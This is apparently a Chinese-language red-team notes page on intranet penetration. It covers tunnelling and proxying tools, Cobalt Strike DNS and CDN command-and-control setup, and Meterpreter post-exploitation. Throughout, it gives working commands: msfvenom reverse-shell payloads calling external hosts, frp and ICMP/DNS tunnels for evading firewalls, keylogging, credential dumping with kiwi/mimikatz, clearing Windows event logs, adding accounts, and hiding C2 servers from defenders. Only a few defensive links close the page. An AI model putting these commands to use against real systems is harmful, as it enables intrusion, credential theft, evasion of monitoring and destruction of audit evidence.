<h4 id="cve-2019-0708">CVE-2019-0708</h4>
<p><strong>漏洞影响版本</strong></p>
<pre><code>Windows 7
Windows server 2008 R2
Windows server 2008
Windows 2003
Windows xp

注:Windows 8和windows10以及之后的版本不受此漏洞影响
</code></pre>
<p>RDP远程控制</p>
<pre><code>exp
https://www.cnblogs.com/qianxiao996/p/13574576.html
exp
https://github.com/k8gege/CVE-2019-0708
</code></pre>
<h4 id="cve-2020-1472常用">CVE-2020-1472（常用）</h4>
<p>域内提权（域内的普通用户直接获取对于域控服务器的控制）</p>
<p><a href="https://blog.csdn.net/adminuil/article/details/108858398">(7条消息) CVE-2020-1472复现（域内提权）_adminuil的博客-CSDN博客</a></p>
<h2 id="代理技术">代理技术</h2>
<h3 id="ngrok">Ngrok</h3>
<p>链接：<code>ngrok.cc</code></p>
<pre><code>./sunny clientid aa0676878c162ffc 
</code></pre>
<p>生成木马(基于http协议)</p>
<pre><code>msfvenom -p windows/meterpreter/reverse_http lhost=xiaodisec.free.idcfengye.com lport=80 -f exe -o test.exe
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set lhost 192.168.76.132
set lport 4444
exploit
</code></pre>
<h3 id="gofrp">gofrp</h3>
<p>链接：<code>gofrp.org</code></p>
<pre><code>服务端-下载-解压-修改-启动（阿里云主机记得修改安全组配置出入口）
服务器修改配置文件frps.ini：
 [common]
 bind_port = 6677
 启动服务端：
 ./frps -c ./frps.ini
 
 msfvenom -p windows/meterpreter/reverse_tcp lhost=101.37.160.211 lport=6000 -f exe -o frp.exe
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
 set LHOST 127.0.0.1
 set LPORT 5555
 exploit
</code></pre>
<p>控制端-下载-解压-修改-启动</p>
<pre><code>控制端修改配置文件frpc.ini：
 [common]
 server_addr = 你的云主机ip
 server_port = 6677        #frpc工作端口，必须和上面frps保持一致
 [msf]
 type = tcp
 local_ip = 127.0.0.1
 local_port = 5555          #转发给本机的5555
 remote_port = 6000         #服务端用6000端口转发给本机
</code></pre>
<h3 id="socks代理技术ew工具">Socks代理技术（ew工具）</h3>
<p>教程:  <a href="http://www.yunweipai.com/39315.html">内网渗透之代理转发 – 运维派 (yunweipai.com)</a></p>
<p>工具：https://github.com/idlefire/ew</p>
<p>环境一（公网攻击机-内网映射公网服务）</p>
<p>公网攻击机</p>
<pre><code>./ew_for_linux64 -s rcsocks -l 1080 -e 1024 &amp;
</code></pre>
<p>该命令的意思是说公网机器监听1080和1024端口。等待攻击者机器访问1080端口，目标机器访问1024端口。</p>
<p>公网服务器</p>
<pre><code class="language-text">./ew_for_linux64 -s rssocks -d 192.168.1.124 -e 1099&amp;
</code></pre>
<h3 id="socks反向代理技术gofrp工具">socks反向代理技术（gofrp工具）</h3>
<pre><code>注意#号在配置文件中不是注释
</code></pre>
<pre><code>必备知识点：
 1.代理和隧道技术区别?
 2.隧道技术为了解决什么?
 3.隧道技术前期的必备条件？
 在数据通信被拦截的情况下利用隧道技术封装改变通信协议进行绕过拦截
 CS、MSF无法上线，数据传输不稳定无回显，出口数据被监控，网络通信存在问题等

在实际的网络中，通常会通过各种边界设备、软/硬件防火墙甚至入侵检测系统来检查对外连接情况，如果发现异样，就会对通信进行阻断。那么什么是隧道呢？这里的隧道，就是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，与对方进行通信。当封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应服务器上。
 常用的隧道技术有以下三种：
 网络层：IPv6 隧道、ICMP 隧道
 传输层：TCP 隧道、UDP 隧道、常规端口转发
 应用层：SSH 隧道、HTTP/S 隧道、DNS 隧道
</code></pre>
<p>攻击机</p>
<pre><code class="language-python">[common]
bind_addr = 0.0.0.0
bind_port = 7002
token = 1q2w3e
heartbeat_timeout = 90
max_pool_count = 5
运行下列命令
./frps -c frps.ini 
</code></pre>
<p>沦陷靶机</p>
<pre><code class="language-python">[common]
server_addr = 42.193.186.7
server_port = 7002
token = 1q2w3e 
pool_count = 5        
protocol = tcp             
health_check_type = tcp
health_check_interval_s = 100

[test] 
remote_port = 7005          
plugin = socks5             
use_encryption = true       
use_compression = true
plugin_user = admin					
plugin_passwd = 123					
./frpc -c frpc.ini
</code></pre>
<h3 id="meterpreter">meterpreter</h3>
<pre><code>Options：选项
-L：用于指定监听主机。 除非需要在特定网络适配器上进行转发，否则可以省略此选项。如果未输入任何值，则将使用0.0.0.0。
-l：这是一个本地端口，它将在攻击机器上侦听。与此端口的连接将被转发到远程系统。
-p：TCP连接将转发到的端口。
-r：连接被中继到的IP地址（目标）。
查看列表
portfwd List
清空列表
portfwd flush
</code></pre>
<p>端口转发</p>
<pre><code> portfwd add –l 3389 –p 3389 –r 172.16.194.141
</code></pre>
<p>路由技术</p>
<pre><code>（全局）
获取路由        run get_local_subnets
添加路由		route add 0.0.0.0 0.0.0.0 sessionid
打印路由		route print 

（meterpreter）
run autoroute -s 192.168.11.0/24
run autoroute -p 						#查看路由的添加情况
</code></pre>
<h3 id="路由转发技术">路由转发技术</h3>
<p>netsh(windows)本地端口转发</p>
<pre><code>netsh interface portproxy add v4tov4 listenaddress=100.100.10.14 listenport=2222 connectaddress=192.168.10.129 connectport=22   

#监听100.100.10.14的2222端口，映射到192.168.10.129 的22端口上
</code></pre>
<p>iptables(linux)本地端口转发</p>
<pre><code>开启数据转发功能：/etc/sysctl.conf  设置 net.ipv4.ip_forward=1

iptables -t nat -L         #查看端口转发记录
iptables -t nat -A PREROUTING -d 192.168.10.21 -p tcp --dport 2222 -j DNAT --to-destination 192.168.10.21:22           #将192.168.10.21的2222端口的流量都转发给192.168.10.21的22端口
iptables -save             #保存
iptables -t nat -F         #清除规则
做本地端口转发，将本地2222端口的流量转发给22端口

</code></pre>
<h2 id="隧道技术">隧道技术</h2>
<h3 id="检测连通性">检测连通性</h3>
<pre><code>1. TCP 协议
    用“瑞士军刀”——netcat
    执行 nc 命令：nc  &lt;端口&gt;
2. HTTP 协议
    用“curl”工具，执行curl &lt;IP地址:端口&gt;命令。如果远程主机开启了相应的端口，且内网可连接外网的话，就会输出相应的端口信息
3. ICMP 协议
    用“ping”命令，执行ping &lt;IP地址/域名&gt;
4. DNS 协议
    检测DNS连通性常用的命令是“nslookup”和“dig”
    nslookup 是windows自带的DNS探测命令
    dig是linux系统自带的DNS探测命令
</code></pre>
<h3 id="icmp隧道">ICMP隧道</h3>
<p>pingtunnel</p>
<pre><code>tcp/udp/sock5流量伪装成icmp流量进行转发的工具
 -p  ##表示连接icmp隧道另一端的机器IP（即目标服务器）
 -lp ##表示需要监听的本地tcp端口
 -da ##指定需要转发的机器的IP（即目标内网某一机器的内网IP）
 -dp ##指定需要转发的机器的端口（即目标内网某一机器的内网端口）
 -x  ##设置连接的密码
</code></pre>
<p>使用方式</p>
<pre><code>./ptunnel -x xiaodi
rdesktop 127.0.0.1 1080
</code></pre>
<p>被控端</p>
<pre><code>./ptunnel -p 192.168.76.150 -lp 1080 -da 192.168.33.33 -dp 3389 -x xiaodi #转发的3389请求数据给本地1080
</code></pre>
<p>老版本介绍：https://github.com/f1vefour/ptunnel(需自行编译)<br>
新版本介绍：https://github.com/esrrhs/pingtunnel(二次开发版)</p>
<h3 id="dns隧道">DNS隧道</h3>
<pre><code>目标机
    iodine -f -r 192.168.0.1 test.com。替换192.168.0.1为服务器的IP地址。
阿里云域名解析
    域名解析
      A记录
        设置一个子域名的DNS服务器地址
          服务器地址指向我们的KALI
      NS记录
        添加一个子域名

在您的服务器上，运行：./iodined -f 10.0.0.1 test.com。如果您已经在使用10.0.0.0网络，请使用另一个内部网络，如 172.16.0.0。

iodine工具：https://github.com/yarrick/iodine
</code></pre>
<h4 id="应用层dns隧道配合cs上线">应用层DNS隧道配合CS上线</h4>
<p>https://www.freebuf.com/articles/web/256032.html</p>
<p>https://zhuanlan.zhihu.com/p/90806965</p>
<p>当常见协议监听器被拦截时，可以换其他协议上线，其中dns协议上线基本通杀</p>
<pre><code> 1.云主机Teamserver配置端口53启用-udp
 2.买一个域名修改解析记录如下：
 A记录-&gt;cs主机名-&gt;CS服务器IP
 NS记录-&gt;ns1主机名-&gt;上个A记录地址
 NS记录-&gt;ns2主机名-&gt;上个A记录地址
</code></pre>
<figure data-type="image" tabindex="15"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210605224250921.png" alt="image-20210605224250921" loading="lazy"></figure>
<p>3.配置DNS监听器内容如下：</p>
<pre><code> ns1.xiaodi8.com
 ns2.xiaodi8.com
 cs.xiaodi8.com
</code></pre>
<p>生产木马</p>
<figure data-type="image" tabindex="16"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210605224428694.png" alt="image-20210605224428694" loading="lazy"></figure>
<figure data-type="image" tabindex="17"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210605224447100.png" alt="image-20210605224447100" loading="lazy"></figure>
<p>4.生成后门执行上线后启用命令：</p>
<figure data-type="image" tabindex="18"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210605223622250.png" alt="image-20210605223622250" loading="lazy"></figure>
<p>点击黑色的机器右键执行如下命令</p>
<pre><code> beacon&gt; checkin
 [*] Tasked beacon to checkin
 beacon&gt; mode dns-txt
 [+] data channel set to DNS-TXT
 [+] host called home, sent: 8 bytes
 beacon&gt; shell whoami
 [*] Tasked beacon to run: whoami
 [+] host called home, sent: 53 bytes
 [+] received output:
 xiaodi-pc\xiaodi
</code></pre>
<h3 id="ssh隧道">SSH隧道</h3>
<ul>
<li>本地端口转发：相当于拉数据，本地从跳板机拉取数据（内网拉取外网数据）</li>
</ul>
<pre><code>目标机
  ssh -CfNg -L (攻击机开放的端口):(目标主机IP地址):(目标端口) root@攻击机IP
  ssh -CfNg -L 8888:百度IP:80 root@192.168.0.2 

攻击机
  开启ssh即可
</code></pre>
<ul>
<li>远程端口转发：相当于推数据，跳板机把数据推到本地(访问内网)</li>
</ul>
<pre><code>目标机
  ssh -CfNg -R (攻击机开放的端口):(目标主机IP地址):(目标端口) root@攻击机IP
攻击机
  开启ssh即可，可以在攻击机上访问
</code></pre>
<ul>
<li>动态端口转发</li>
</ul>
<pre><code>VPS
    ssh -CfNg -D 8888 root目标机器IP
      输入密码即可链接
        浏览器开启SOCKS5代理
  目标机
    开启SSH
翻墙可以使用哦
</code></pre>
<ul>
<li>更改默认端口逃避防火墙</li>
</ul>
<pre><code>更改默认端口22
  /etc/ssh/sshd_config 　　– PermitRootLogin yes 　　– Port 53　　
  // ssh的默认端口是22，改为53是假设防火墙的规则设定的比较死，只允许出站的流量为53的情况下，ssh隧道建立的端口就为53 　　– PasswordAuthentication yes 
  service sshd restart
</code></pre>
<h3 id="httphttps协议socks隧道">HTTP/HTTPS协议（socks隧道）</h3>
<p>reGeorg</p>
<pre><code>reGeorg-----一款正向代理工具，即把代理脚本扔到跳板机上（当然会被杀软干掉的），然后攻击机VPS去连接跳板机
下载链接   https://github.com/sensepost/reGeorg
https://www.proxifier.com
https://github.com/rofl0r/proxychains-ng
http://proxychains.sourceforge.net/

参考文章：
https://www.cnblogs.com/7-58/p/12932649.html
https://cloud.tencent.com/developer/article/1674107
比如proxychains需要vim /etc/proxychains.conf   ，在最后添加一行，具体配合reGeorg端口：　　socks5 127.0.0.1 port
</code></pre>
<p>上传木马</p>
<pre><code>取得跳板机权限了之后，需要把tunnel.什么什么上传到跳板机上（别忘了要扔到web目录里啊），这个什么，取决于跳板机支持什么语言环境（aspx,jsp,php,ashx)

攻击机VPS上执行　　　　python reGeorgSocksProxy.py -u http://公ip2/tunnel.nosocket.php -p port
话说如果有meterpreter，run get_local_subnets获取网络接口、run autoroute -p 查看路由、run autoroute -s x.x.x.0/24加个路由，
use auxiliary/server/socks4a，set srvport port ,然后按照上面的步骤改proxychains.conf（注意这回用socks4啊，socks4 IP port），也一样能实现将攻击机VPS

“贴”到跳板机上
（补充一点题外话：警告！！！存在多级网络跳跃的情况的时候，即攻击者通过连主机A再到主机B再到主机C......　　注意选择是正向连接目标还是反向连接目标，例如用tcp协议的话，是set payload windows/meterpreter/bind_tcp还是set payload windows/meterpreter/reverse_tcp
目标机器能找到攻击机的话优先选反向reverse，目标机器不能找得到攻击机的话用正向bind
生成后门的时候也注意选择正向后门，例如  msfvenom -p linux/x64/meterpreter/bind_tcp ......还是反向后门 例如 msfvenom -p linux/x64/meterpreter/reverse_tcp......）

 
</code></pre>
<h3 id="https隧道cscdnhttps">HTTPS隧道（CS+CDN+HTTPS）</h3>
<p>文章：https://www.ddosi.com/cobaltstrike-hide/#CDNhttps%E4%B8%8A%E7%BA%BF</p>
<p>cloudflare</p>
<figure data-type="image" tabindex="19"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210623213921268.png" alt="image-20210623213921268" loading="lazy"></figure>
<p>下载文件</p>
<figure data-type="image" tabindex="20"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210623213456387.png" alt="image-20210623213456387" loading="lazy"></figure>
<figure data-type="image" tabindex="21"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210623213542566.png" alt="image-20210623213542566" loading="lazy"></figure>
<pre><code>openssl pkcs12 -export -in 1.pem -inkey 1.key -out a.p12 -name cs2.safebug.top -passout pass:123456
keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore https.store -srckeystore a.p12 -srcstoretype PKCS12 -srcstorepass 123456 -alias cs2.safebug.top
</code></pre>
<p>完成以上两部</p>
<pre><code>进入cobalt strike目录
[root@ecs-HxXuQ cobaltstrike4.3]# mv cobaltstrike.store cobaltstrike.store.bak
[root@ecs-HxXuQ cobaltstrike4.3]# mv https.store cobaltstrike.store

重启cs
</code></pre>
<p>配置cs</p>
<figure data-type="image" tabindex="22"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210623213921268.png" alt="image-20210623213815134" loading="lazy"></figure>
<h2 id="权限维持">权限维持</h2>
<h3 id="票据技术">票据技术</h3>
<h4 id="白银票据">白银票据</h4>
<h4 id="黄金票据">黄金票据</h4>
<h3 id="委派维持">委派维持</h3>
<p>非约束委派攻击</p>
<p>https://www.redteaming.top/2020/02/11/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Kerberos%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%88%A9%E7%94%A8</p>
<p>约束委派攻击</p>
<p>基于资源约束委派攻击</p>
<h3 id="sid-history域后门">SID History域后门</h3>
<p>将administrator的SID添加到恶意用户的SID history属性中</p>
<p><a href="https://blog.csdn.net/qq_36119192/article/details/104372241">(7条消息) 域控权限持久化之SID History域后门_谢公子的博客-CSDN博客</a></p>
<h3 id="skeleton-key万能密码">Skeleton Key(万能密码)</h3>
<p><a href="https://blog.csdn.net/qq_36119192/article/details/104375915">(7条消息) 域控权限持久化之Skeleton Key(万能密码)_谢公子的博客-CSDN博客</a></p>
<h3 id="dsrm后门">DSRM后门</h3>
<p><a href="https://blog.csdn.net/qq_36119192/article/details/104371122">(7条消息) 域控权限持久化之DSRM后门_谢公子的博客-CSDN博客</a></p>
<h2 id="msf后渗透">MSF后渗透</h2>
<h3 id="meterperter基本系统命令">meterperter基本系统命令</h3>
<pre><code>background   # 将当前会话放置后台
sessions   # sessions –h 查看帮助
sessions -i &lt;ID值&gt;  #进入会话   -k  杀死会话
bgrun / run   # 执行已有的模块，输入run后按两下tab，列出已有的脚本
info   # 查看已有模块信息
getuid   # 查看当前用户身份
getprivs  # 查看当前用户具备的权限
getpid   # 获取当前进程ID(PID)
sysinfo   # 查看目标机系统信息
irb   # 开启ruby终端
ps   # 查看正在运行的进程    
kill &lt;PID值&gt; # 杀死指定PID进程
idletime     # 查看目标机闲置时间
reboot / shutdown    # 重启/关机
shell    # 进入目标机cmd shell

execute -H -i -f  cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互  #执行文件
</code></pre>
<p>进程迁移</p>
<pre><code>getpid    # 获取当前进程的pid
ps   # 查看当前活跃进程
migrate &lt;pid值&gt;    # 将Meterpreter会话移植到指定pid值进程中
kill &lt;pid值&gt;   # 杀死进程
</code></pre>
<p>键盘记录</p>
<pre><code class="language-shell">keyscan_start  # 开始键盘记录
keyscan_dump   # 导出记录数据
keyscan_stop   # 结束键盘记录
</code></pre>
<p>删除日志</p>
<pre><code class="language-shell">clearev  # 清除windows中的应用程序日志、系统日志、安全日志
</code></pre>
<p>常用cmd命令</p>
<pre><code>whoami  # 当前权限
quser  # 查询当前在线的管理员
net user  # 查看存在用户
net user 用户名 密码 /add  # 添加用户和对应密码
net localgroup 用户组名 用户名 /add  # 将指定用户添加到指定用户组
netstat -ano  # 查询当前计算机中网络连接通信情况，LISTENING表示该端口处于监听状态；ESTABLISHED表示该端口处于工作（通信）状态
systeminfo  # 查看当前计算机中的详细情况
tasklist /svc  # 查看每个进程所对应的服务
taskkill /f /im 程序名称  # 结束某个指定名称的程序
taskkill /f /PID ID  # 结束某个指定PID的进程
tasklist | findstr &quot;字符串&quot; # 查找输出结果中指定的内容
netsh adcfirewall set allprofiles state off  # 关闭防火墙
logoff  # 注销某个指定用户的ID
shutdown -r  # 重启当前计算机
</code></pre>
<p>kiwi模块</p>
<pre><code class="language-shell">load kiwi
creds_all：列举所有凭据
creds_kerberos：列举所有kerberos凭据
creds_msv：列举所有msv凭据
creds_ssp：列举所有ssp凭据
creds_tspkg：列举所有tspkg凭据
creds_wdigest：列举所有wdigest凭据
dcsync：通过DCSync检索用户帐户信息
dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID
golden_ticket_create：创建黄金票据
kerberos_ticket_list：列举kerberos票据
kerberos_ticket_purge：清除kerberos票据
kerberos_ticket_use：使用kerberos票据
kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令
lsa_dump_sam：dump出lsa的SAM
lsa_dump_secrets：dump出lsa的密文
password_change：修改密码
wifi_list：列出当前用户的wifi配置文件
wifi_list_shared：列出共享wifi配置文件/编码
</code></pre>
<p>使用mimikatz</p>
<pre><code>load kiwi
kiwi_cmd mimikatz命令
</code></pre>
<h3 id="msf后渗透模块">MSF后渗透模块</h3>
<p><a href="https://blog.csdn.net/qq_17204441/article/details/89063425">(12条消息) MSF内网渗透 扫描模块_卿's Blog-CSDN博客</a></p>
<p>后渗透</p>
<pre><code>exploit/windows/smb/psexec
</code></pre>
<figure data-type="image" tabindex="23"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/20191215141315915.png" alt="img" loading="lazy"></figure>
<p>端口扫描端口扫描</p>
<pre><code>auxiliary/scanner/portscan
scanner/portscan/ack    ACK防火墙扫描
scanner/portscan/ftpbounce FTP跳端口扫描
scanner/portscan/syn    SYN端口扫描
scanner/portscan/tcp    TCP端口扫描
scanner/portscan/xmas    TCP&quot;XMas&quot;端口扫描
</code></pre>
<p>主机存活探测</p>
<pre><code>auxiliary/scanner/discovery/udp_sweep    #基于udp协议发现内网存活主机
auxiliary/scanner/discovery/udp_probe    #基于udp协议发现内网存活主机
auxiliary/scanner/netbios/nbname         #基于netbios协议发现内网存活主机
auxiliary/scanner/portscan/tcp           #基于tcp进行端口扫描(1-10000)，如果开放了端口，则说明该主机存活
</code></pre>
<p>SMB扫描</p>
<pre><code>auxiliary/scanner/ftp/ftp_version        #发现内网ftp服务，基于默认21端口
auxiliary/scanner/ssh/ssh_version        #发现内网ssh服务，基于默认22端口
auxiliary/scanner/telnet/telnet_version  #发现内网telnet服务，基于默认23端口
auxiliary/scanner/dns/dns_amp            #发现dns服务，基于默认53端口
auxiliary/scanner/http/http_version      #发现内网http服务，基于默认80端口
auxiliary/scanner/http/title             #探测内网http服务的标题
auxiliary/scanner/smb/smb_version        #发现内网smb服务，基于默认的445端口   
use auxiliary/scanner/mssql/mssql_schemadump  #发现内网SQLServer服务,基于默认的1433端口
use auxiliary/scanner/oracle/oracle_hashdump  #发现内网oracle服务,基于默认的1521端口 
auxiliary/scanner/mysql/mysql_version    #发现内网mysql服务，基于默认3306端口
auxiliary/scanner/rdp/rdp_scanner        #发现内网RDP服务，基于默认3389端口
auxiliary/scanner/redis/redis_server     #发现内网Redis服务，基于默认6379端口
auxiliary/scanner/db2/db2_version        #探测内网的db2服务，基于默认的50000端口
auxiliary/scanner/netbios/nbname         #探测内网主机的netbios名字
</code></pre>
<h2 id="cobalt-strike后渗透">cobalt strike后渗透</h2>
<p>cobaltstrike插件</p>
<pre><code>https://github.com/hack2fun/BypassAV 绕过AV
https://github.com/pandasec888/taowu-cobalt-strike  大集合
https://github.com/z1un/Z1-AggressorScripts  大集合
参考资料
cobaltstrike云服务器安装
https://hackergu.com/cobaltstrike%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%89%E8%A3%85/
cs永久运行
https://blog.csdn.net/qq_44657899/article/details/114306472
启动团队服务器
nohup ./teamserver 42.193.186.7 ASDqwe123 &amp;
</code></pre>
<p>beacon命令</p>
<pre><code>执行命令： shell  whoami
</code></pre>
<h3 id="一些资料">一些资料</h3>
<p><strong>CobaltStrike上线隐藏|DNS|CDN|云函数</strong></p>
<p>https://www.ddosi.com/cobaltstrike-hide/#CDNhttps%E4%B8%8A%E7%BA%BF</p>
<p>cobalt strike特征隐藏|修改默认端口|去除证书特征|混淆配置</p>
<p>https://www.ddosi.com/cobalt-strike-bypass/</p>
<p>隐藏源IP|提高溯源难度|隐藏cobalt strike服务器</p>
<p>https://www.ddosi.com/c2-hidden/#</p>
<h3 id="cobalt-strike配置隐藏">cobalt strike配置隐藏</h3>
<pre><code>1.更改默认端口
vi teamserver

2.去除证书特征
Cobalt Strike默认的证书已经是分分钟被逮,所以需要生成一个新的证书
这里可以用keytool这个工具。操作简单。Keytool是一个Java数据证书的管理工具,Keytool将密钥（key）和证书（certificates）存在一个称为keystore的文件中,即store后缀文件中。
</code></pre>
<figure data-type="image" tabindex="24"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/1392192-20210520204927340-497762871.png" alt="img" loading="lazy"></figure>
<p>更换证书</p>
<h3 id="cobalt-strike域前置技术">cobalt strike（域前置技术）</h3>
<h3 id="cobalt-strike隐藏技术尽量不使用ip重定向技术">cobalt strike隐藏技术（尽量不使用IP）重定向技术</h3>
<pre><code>DNS服务器-&gt;外网服务器-&gt;teamserver服务器-&gt;kali

重定向技术
DNS服务器：r1.cs.com解析ip为外网服务器
外网服务器:socat转发
teamserver服务器：接受数据
</code></pre>
<h3 id="cobalt-strike隐藏技术尽量不使用ipcdn技术">cobalt strike隐藏技术（尽量不使用IP）CDN技术</h3>
<p>godaddy设置</p>
<pre><code>1.购买域名https://dcc.godaddy.com/
2.DNS域名服务器设置为cloudflare
</code></pre>
<figure data-type="image" tabindex="25"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210622232348549.png" alt="image-20210622232348549" loading="lazy"></figure>
<p>cloudflare设置</p>
<pre><code>1.注册登录账号
2.添加网站设置CDN
3.关闭缓存 如下图

Cloudflare有个特点，如果用其他端口的话，是监听不到的
Cloudflare支持的HTTP端口是：80,8080,8880,2052,2082,2086,2095
Cloudflare支持的HTTPs端口是：443,2053,2083,2087,2096,8443
</code></pre>
<figure data-type="image" tabindex="26"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210622210736110.png" alt="image-20210622210736110" loading="lazy"></figure>
<figure data-type="image" tabindex="27"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210623000719412.png" alt="image-20210623000719412" loading="lazy"></figure>
<p>cobalt strike设置</p>
<figure data-type="image" tabindex="28"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210623000644572.png" alt="image-20210623000644572" loading="lazy"></figure>
<p>自己的参数</p>
<pre><code>阿里云服务器：safebug.top cdn
</code></pre>
<h3 id="cobalt-strike隐藏技术腾讯云函数技术">cobalt strike隐藏技术（腾讯云函数技术）</h3>
<h3 id="配置禁止ip访问服务器仅允许cdn的ip">配置禁止IP访问服务器仅允许CDN的IP</h3>
<pre><code>https://www.bnxb.com/nginx/27638.html
</code></pre>
<h2 id="安全加固">安全加固</h2>
<p><a href="https://github.com/0Kee-Team/WatchAD">0Kee-Team/WatchAD: AD Security Intrusion Detection System (github.com)</a></p>
<p><a href="https://github.com/0Kee-Team/WatchAD/blob/master/README_zh-cn.md">WatchAD/README_zh-cn.md at master · 0Kee-Team/WatchAD (github.com)</a></p>
<p><a href="https://edu.heibai.org/02%E6%9C%80%E5%90%8E%E7%9A%84%E9%98%B2%E7%BA%BF%EF%BC%81%E9%AB%98%E7%BA%A7%E5%9F%9F%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E6%A3%80%E6%B5%8B(1).pdf">PowerPoint 演示文稿 (heibai.org)</a></p>
]]></content>
    </entry>
</feed>